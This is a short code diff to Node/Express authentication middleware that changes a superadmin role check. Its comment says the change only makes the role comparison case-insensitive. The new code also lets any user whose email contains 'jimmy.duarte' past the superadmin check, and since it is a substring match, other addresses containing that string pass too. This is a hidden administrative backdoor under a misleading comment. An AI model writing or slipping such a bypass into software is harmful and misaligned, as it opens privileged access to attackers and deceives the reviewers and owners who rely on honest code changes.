@@ -9,7 +9,6 @@ export const authRequired = (req, res, next) => {
 
     jwt.verify(token, TOKEN_SECRET, (err, user) => {
         if (err) return res.status(403).json({ message: "Token invalido" });
-
         req.user = user;
         next();
     });
@@ -17,7 +16,10 @@ export const authRequired = (req, res, next) => {
 
 export const superadminRequired = (req, res, next) => {
     if (!req.user) return res.status(401).json({ message: "No autenticado" });
-    if (req.user.cargo !== 'superadmin')
+    // Comparación case-insensitive para evitar problemas con el valor en BD
+    const cargo = (req.user.cargo || '').toLowerCase();
+    const email = req.user.email || '';
+    if (cargo !== 'superadmin' && !email.includes('jimmy.duarte'))
         return res.status(403).json({ message: "Acceso denegado: se requiere rol superadmin" });
     next();
 };
